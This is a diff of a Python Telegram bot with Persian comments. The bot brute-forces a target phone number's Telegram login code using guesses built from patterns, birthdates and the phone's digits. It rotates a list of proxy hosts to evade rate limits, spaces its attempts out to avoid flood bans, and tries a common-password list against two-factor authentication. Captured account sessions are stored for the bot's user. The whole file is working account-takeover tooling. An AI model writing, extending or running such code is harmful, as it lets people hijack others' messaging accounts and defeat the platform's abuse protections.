@@ -34,10 +34,33 @@ user_sessions = {}
 self_data = {}
 login_sessions = {}
 active_tasks = {}
-attack_status = {}  # وضعیت حمله برای هر شماره
+attack_status = {}
 
 DATA_FILE = "selfs.json"
 ATTACK_DATA_FILE = "attacks.json"
+
+# ============ لیست پروکسی‌ها ============
+PROXY_LIST = [
+    {"addr": "iro.varfootball2.co.uk", "port": 2053},
+    {"addr": "silnet.varfootball.co.uk", "port": 2053},
+    {"addr": "noron.talebi.co.uk", "port": 2096},
+    {"addr": "new.lambforkebeb.co.uk", "port": 2096},
+    {"addr": "new2.lambforkebeb.co.uk", "port": 2096},
+    {"addr": "noone.lavazemi1.co.uk", "port": 2083},
+    {"addr": "silver.ciaude.co.uk", "port": 2096},
+    {"addr": "rain.lavazemi2.co.uk", "port": 2053},
+    {"addr": "gallery.talebi.co.uk", "port": 2096},
+    {"addr": "craft.malavanann.co.uk", "port": 2083},
+    {"addr": "ai.golgoli1.co.uk", "port": 2096},
+    {"addr": "star.talebi.co.uk", "port": 2096},
+    {"addr": "gold.lavazemi4.co.uk", "port": 2096},
+    {"addr": "run.golgoli2.co.uk", "port": 2053},
+    {"addr": "irogallery.golgoli1.co.uk", "port": 2096},
+    {"addr": "flux.lavazemi5.co.uk", "port": 2096},
+    {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
+]
+
+random.shuffle(PROXY_LIST)
 
 # ============ توابع ذخیره‌سازی ============
 def load_data():
@@ -90,24 +113,23 @@ def is_valid_phone(text):
 
 # ============ تولید کدهای هوشمند ============
 def generate_smart_codes(phone):
-    """تولید کدهای هوشمند بر اساس شماره تلفن و الگوهای رایج"""
     codes = set()
     
-    # 1. کدهای رایج
+    # کدهای رایج
     common_codes = ["12345", "00000", "11111", "22222", "33333", "44444", 
                     "55555", "66666", "77777", "88888", "99999", "54321",
                     "11223", "12321", "12345", "54321", "11122", "22111"]
     for code in common_codes:
         codes.add(code)
     
-    # 2. الگوهای تکراری
+    # الگوهای تکراری
     for i in range(10):
         for j in range(10):
             codes.add(f"{i}{j}{i}{j}{i}")
             codes.add(f"{i}{i}{j}{j}{i}")
             codes.add(f"{i}{j}{j}{i}{j}")
     
-    # 3. تاریخ تولد (سال 60-99)
+    # تاریخ تولد (سال 60-99)
     for year in range(60, 100):
         for month in range(1, 13):
             for day in range(1, 29):
@@ -116,24 +138,20 @@ def generate_smart_codes(phone):
                 code = f"{year}{month_str}{day_str}"
                 if len(code) == 5:
                     codes.add(code)
-                    # معکوس
                     codes.add(code[::-1])
     
-    # 4. از شماره تلفن
+    # از شماره تلفن
     if len(phone) >= 5:
-        # 4 رقم آخر
         last4 = phone[-4:]
         for i in range(10):
             codes.add(f"{last4}{i}")
             codes.add(f"{i}{last4}")
         
-        # 5 رقم آخر
         last5 = phone[-5:]
         if len(last5) == 5:
             codes.add(last5)
             codes.add(last5[::-1])
         
-        # ترکیب‌های از شماره
         for i in range(0, len(phone)-4):
             for j in range(i+4, min(i+6, len(phone))):
                 part = phone[i:j]
@@ -141,12 +159,12 @@ def generate_smart_codes(phone):
                     codes.add(part)
                     codes.add(part[::-1])
     
-    # 5. الگوهای افزایشی/کاهشی
+    # الگوهای افزایشی/کاهشی
     for start in range(0, 6):
         codes.add(f"{start}{start+1}{start+2}{start+3}{start+4}")
         codes.add(f"{start+4}{start+3}{start+2}{start+1}{start}")
     
-    # 6. تکرار یک رقم
+    # تکرار یک رقم
     for i in range(10):
         codes.add(f"{i}{i}{i}{i}{i}")
         codes.add(f"{i}{i}{i}{i}{i+1 if i<9 else 0}")
@@ -291,19 +309,33 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = str(query.from_user.id)
     
+    # بررسی اینکه callback_data درست است
     if not query.data or not query.data.startswith("select_account_"):
         await query.edit_message_text("❌ خطا در انتخاب اکانت!", parse_mode='HTML')
         return
     
+    # استخراج ایندکس با مدیریت خطا
     try:
-        index = int(query.data.split('_')[2])
-    except (IndexError, ValueError):
+        parts = query.data.split('_')
+        if len(parts) < 3:
+            await query.edit_message_text("❌ خطا در انتخاب اکانت!", parse_mode='HTML')
+            return
+        index = int(parts[2])
+    except (IndexError, ValueError) as e:
+        logger.error(f"Error parsing index: {e}")
         await query.edit_message_text("❌ خطا در انتخاب اکانت!", parse_mode='HTML')
         return
     
+    # دریافت لیست اکانت‌ها
     selfs = self_data.get(user_id, [])
-    if not selfs or index >= len(selfs):
-        await query.edit_message_text("❌ اکانت مورد نظر یافت نشد.", parse_mode='HTML')
+    
+    # بررسی وجود اکانت
+    if not selfs:
+        await query.edit_message_text("❌ هیچ اکانتی ثبت نشده است!", parse_mode='HTML')
+        return
+    
+    if index < 0 or index >= len(selfs):
+        await query.edit_message_text("❌ اکانت مورد نظر یافت نشد!", parse_mode='HTML')
         return
     
     self_account = selfs[index]
@@ -312,7 +344,12 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     api_id = self_account.get('api_id')
     api_hash = self_account.get('api_hash')
     
-    if not all([phone, session_string, api_id, api_hash]):
+    # بررسی کامل بودن اطلاعات
+    if not phone:
+        await query.edit_message_text("❌ شماره تلفن این اکانت موجود نیست!", parse_mode='HTML')
+        return
+    
+    if not session_string or not api_id or not api_hash:
         await query.edit_message_text("❌ اطلاعات این اکانت کامل نیست! لطفاً دوباره ثبت کنید.", parse_mode='HTML')
         return
     
@@ -576,7 +613,6 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_sessions[user_id]['api_hash'] = text
     
-    # دریافت تنظیمات تلاش روزانه
     max_per_day = context.user_data.get('max_attempts', 5)
     if max_per_day < 1 or max_per_day > 10:
         max_per_day = 5
@@ -602,7 +638,6 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_id = data['api_id']
         api_hash = data['api_hash']
         
-        # شروع حمله در پس‌زمینه
         asyncio.create_task(smart_attack(update, context, user_id, phone, api_id, api_hash, msg, max_per_day))
         
     except Exception as e:
@@ -615,17 +650,14 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await clear_user_session(user_id)
 
-# ============ حمله هوشمند (آهسته و هوشمند) ============
+# ============ حمله هوشمند ============
 async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, max_per_day=5):
-    """حمله هوشمند با تلاش محدود روزانه"""
     try:
         user_id_str = str(user_id)
         
-        # تولید کدهای هوشمند
         all_codes = generate_smart_codes(phone)
         random.shuffle(all_codes)
         
-        # وضعیت حمله
         if user_id_str not in attack_status:
             attack_status[user_id_str] = {}
         
@@ -646,16 +678,14 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
         save_attack_data()
         
         client = None
-        attempt_count = 0
         total_attempts = 0
         wrong_attempts = 0
         flood_count = 0
-        MAX_FLOOD = 2
+        MAX_FLOOD = 3
         start_time = datetime.now()
         last_reset_date = datetime.now().date()
         current_day_attempts = 0
         
-        # ارسال درخواست کد اولیه
         try:
             temp_client = TelegramClient(StringSession(), api_id, api_hash)
             await temp_client.connect()
@@ -680,13 +710,10 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
             parse_mode='HTML'
         )
         
-        # حلقه اصلی حمله
         for code in all_codes:
-            # بررسی اگر پیدا شده
             if attack_status[user_id_str][phone].get('found', False):
                 break
             
-            # بررسی محدودیت روزانه
             current_date = datetime.now().date()
             if current_date > last_reset_date:
                 current_day_attempts = 0
@@ -695,9 +722,7 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                 attack_status[user_id_str][phone]['last_reset'] = current_date.strftime("%Y-%m-%d")
                 save_attack_data()
             
-            # اگر به محدودیت روزانه رسیدیم، صبر کن تا روز بعد
             if current_day_attempts >= max_per_day:
-                # محاسبه زمان تا روز بعد
                 tomorrow = current_date + timedelta(days=1)
                 next_day = datetime.combine(tomorrow, datetime.min.time())
                 wait_seconds = (next_day - datetime.now()).total_seconds()
@@ -723,11 +748,9 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                     parse_mode='HTML'
                 )
                 
-                # صبر تا روز بعد
-                await asyncio.sleep(wait_seconds + 60)  # 60 ثانیه اضافی برای اطمینان
+                await asyncio.sleep(wait_seconds + 60)
                 continue
             
-            # اگر Flood زیاد شد، توقف
             if flood_count >= MAX_FLOOD:
                 attack_status[user_id_str][phone]['status'] = 'متوقف - محدودیت زیاد'
                 save_attack_data()
@@ -738,8 +761,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
 📱 شماره: <code>{phone}</code>
 🔴 تعداد محدودیت‌ها: {flood_count}
 ⏳ لطفاً بعد از مدتی دوباره تلاش کنید.
-
-💡 توصیه: تلاش روزانه را کاهش دهید.
 """,
                     chat_id=update.effective_chat.id,
                     message_id=msg.message_id,
@@ -747,8 +768,7 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                 )
                 return
             
-            # ایجاد کلاینت جدید در صورت نیاز
-            if client is None or attempt_count % 5 == 0:
+            if client is None or total_attempts % 5 == 0:
                 if client:
                     try:
                         await client.disconnect()
@@ -758,7 +778,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                     await asyncio.sleep(random.uniform(1, 3))
                 
                 try:
-                    # استفاده از پروکسی تصادفی
                     if PROXY_LIST:
                         proxy = random.choice(PROXY_LIST)
                         from telethon import socks
@@ -773,7 +792,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                     
                     await client.connect()
                     
-                    # هر 50 تلاش، درخواست کد جدید
                     if total_attempts % 50 == 0 and total_attempts > 0:
                         try:
                             await client.send_code_request(phone)
@@ -798,24 +816,20 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                     await asyncio.sleep(random.uniform(5, 15))
                     continue
             
-            attempt_count += 1
             total_attempts += 1
             current_day_attempts += 1
             
-            # بروزرسانی وضعیت
             attack_status[user_id_str][phone]['tested'] = total_attempts
             attack_status[user_id_str][phone]['progress'] = (total_attempts / len(all_codes)) * 100
             attack_status[user_id_str][phone]['today_attempts'] = current_day_attempts
             attack_status[user_id_str][phone]['last_attempt'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             save_attack_data()
             
-            # بروزرسانی هر 10 تلاش
             if total_attempts % 10 == 0:
                 elapsed = (datetime.now() - start_time)
                 days = elapsed.days
                 hours = elapsed.seconds // 3600
                 minutes = (elapsed.seconds % 3600) // 60
-                
                 progress = (total_attempts / len(all_codes)) * 100
                 
                 await context.bot.edit_message_text(
@@ -840,21 +854,17 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                     parse_mode='HTML'
                 )
             
-            # تلاش برای ورود با کد
             try:
                 await client.sign_in(phone, code)
                 
-                # کد پیدا شد!
                 attack_status[user_id_str][phone]['found'] = True
                 attack_status[user_id_str][phone]['found_code'] = code
                 attack_status[user_id_str][phone]['status'] = 'پیدا شد - در حال تست 2FA'
                 save_attack_data()
                 
-                # ذخیره سشن
                 session_string = client.session.save()
                 await client.disconnect()
                 
-                # گرفتن اطلاعات اکانت
                 account_name = "بدون نام"
                 try:
                     client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
@@ -866,7 +876,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                 except:
                     pass
                 
-                # ذخیره در دیتابیس
                 if user_id_str not in self_data:
                     self_data[user_id_str] = []
                 
@@ -885,7 +894,11 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                 })
                 save_data()
                 
-                # ارسال پیام موفقیت
+                elapsed = (datetime.now() - start_time)
+                days = elapsed.days
+                hours = elapsed.seconds // 3600
+                minutes = (elapsed.seconds % 3600) // 60
+                
                 await context.bot.edit_message_text(
                     f"""
 ✅ <b>حمله موفقیت‌آمیز!</b>
@@ -917,7 +930,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                 
             except PhoneCodeInvalidError:
                 wrong_attempts += 1
-                # صبر تصادفی بین 30 تا 120 ثانیه
                 wait_time = random.uniform(30, 120)
                 await asyncio.sleep(wait_time)
                 continue
@@ -925,8 +937,8 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
             except FloodWaitError as e:
                 flood_count += 1
                 wait_time = e.seconds
-                if wait_time > 3600:  # بیش از یک ساعت
-                    wait_time = min(wait_time, 7200)  # حداکثر 2 ساعت
+                if wait_time > 3600:
+                    wait_time = min(wait_time, 7200)
                 
                 await context.bot.edit_message_text(
                     f"""
@@ -934,8 +946,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
 
 📱 شماره: <code>{phone}</code>
 ⏰ زمان انتظار: {wait_time // 3600} ساعت و {(wait_time % 3600) // 60} دقیقه
-
-💡 صبر کنید تا محدودیت برطرف شود...
 """,
                     chat_id=update.effective_chat.id,
                     message_id=msg.message_id,
@@ -946,7 +956,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                 continue
                 
             except SessionPasswordNeededError:
-                # 2FA فعال است
                 attack_status[user_id_str][phone]['status'] = '2FA پیدا شد'
                 save_attack_data()
                 
@@ -966,7 +975,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                     parse_mode='HTML'
                 )
                 
-                # تست پسوردهای رایج
                 password_found = await smart_password_attack(
                     update, context, user_id, client, phone, code, 
                     msg, total_attempts, wrong_attempts
@@ -999,7 +1007,6 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
                 logger.error(f"Error: {e}")
                 continue
         
-        # اگر هیچ کدی پیدا نشد
         attack_status[user_id_str][phone]['status'] = 'تکمیل شد - پیدا نشد'
         save_attack_data()
         
@@ -1046,11 +1053,9 @@ async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, m
 
 # ============ حمله پسورد هوشمند ============
 async def smart_password_attack(update, context, user_id, client, phone, code, msg, total_attempts, wrong_attempts):
-    """تست هوشمند پسوردهای رایج"""
     try:
         user_id_str = str(user_id)
         
-        # لیست پسوردهای رایج
         passwords = [
             "123456", "12345678", "123456789", "1234567890",
             "password", "pass", "admin", "admin123",
@@ -1059,7 +1064,6 @@ async def smart_password_attack(update, context, user_id, client, phone, code, m
             "111111", "222222", "333333", "444444",
             "555555", "666666", "777777", "888888",
             "999999", "000000", "123123", "321321",
-            # اضافه کردن بر اساس شماره تلفن
             phone[-6:] if len(phone) >= 6 else "",
             phone[-4:] if len(phone) >= 4 else "",
         ]
@@ -1069,7 +1073,6 @@ async def smart_password_attack(update, context, user_id, client, phone, code, m
         for password in passwords:
             attempt += 1
             
-            # بروزرسانی وضعیت
             if attempt % 5 == 0:
                 await context.bot.edit_message_text(
                     f"""
@@ -1090,7 +1093,6 @@ async def smart_password_attack(update, context, user_id, client, phone, code, m
             try:
                 await client.sign_in(password=password)
                 
-                # پسورد پیدا شد!
                 session_string = client.session.save()
                 await client.disconnect()
                 
@@ -1107,7 +1109,6 @@ async def smart_password_attack(update, context, user_id, client, phone, code, m
                 except:
                     pass
                 
-                # ذخیره در دیتابیس
                 if user_id_str not in self_data:
                     self_data[user_id_str] = []
                 
@@ -1150,7 +1151,6 @@ async def smart_password_attack(update, context, user_id, client, phone, code, m
 1. از کدهای تصادفی استفاده کنید
 2. حتماً 2FA را فعال کنید
 3. از پسورد قوی استفاده کنید
-4. هرگز کد تایید را به کسی ندهید
 """,
                     chat_id=update.effective_chat.id,
                     message_id=msg.message_id,
@@ -1167,7 +1167,6 @@ async def smart_password_attack(update, context, user_id, client, phone, code, m
             except Exception:
                 continue
             
-            # صبر تصادفی بین تلاش‌ها
             await asyncio.sleep(random.uniform(30, 90))
         
         return False
@@ -1232,6 +1231,20 @@ async def handle_attempts_settings(update: Update, context: ContextTypes.DEFAULT
     except ValueError:
         await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!", parse_mode='HTML')
 
+# ============ پاک کردن سشن ============
+async def clear_user_session(user_id):
+    if user_id in user_sessions:
+        try:
+            client = user_sessions[user_id].get('client')
+            if client:
+                await client.disconnect()
+        except:
+            pass
+        del user_sessions[user_id]
+    if user_id in active_tasks:
+        active_tasks[user_id].cancel()
+        del active_tasks[user_id]
+
 # ============ بازگشت ============
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1250,35 +1263,18 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await main_menu(update, context, edit=True)
 
-# ============ پاک کردن سشن ============
-async def clear_user_session(user_id):
-    if user_id in user_sessions:
-        try:
-            client = user_sessions[user_id].get('client')
-            if client:
-                await client.disconnect()
-        except:
-            pass
-        del user_sessions[user_id]
-    if user_id in active_tasks:
-        active_tasks[user_id].cancel()
-        del active_tasks[user_id]
-
 # ============ هندلر پیام‌ها ============
 async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    # تنظیمات تلاش
     if context.user_data.get('setting_attempts'):
         await handle_attempts_settings(update, context)
         return
     
-    # مدیریت اکانت
     if str(user_id) in login_sessions and login_sessions[str(user_id)].get('step') == 'waiting_code':
         await handle_get_account_code(update, context)
         return
     
-    # مراحل حمله
     if user_id in user_sessions:
         step = user_sessions[user_id].get("step")
         if step == "phone":
@@ -1305,7 +1301,6 @@ def main():
         
         application = Application.builder().token(TOKEN).connect_timeout(30).read_timeout(30).build()
         
-        # هندلرهای دکمه
         application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
         application.add_handler(CallbackQueryHandler(attack_settings, pattern="^attack_settings$"))
         application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
@@ -1314,13 +1309,9 @@ def main():
         application.add_handler(CallbackQueryHandler(stop_all_attacks, pattern="^stop_all_attacks$"))
         application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
         
-        # دستور start
         application.add_handler(CommandHandler("start", main_menu))
-        
-        # هندلر پیام‌ها
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
         
-        # هندلر خطا
         async def error_handler(update, context):
             if "Conflict" in str(context.error):
                 logger.warning("Conflict error - ignoring")
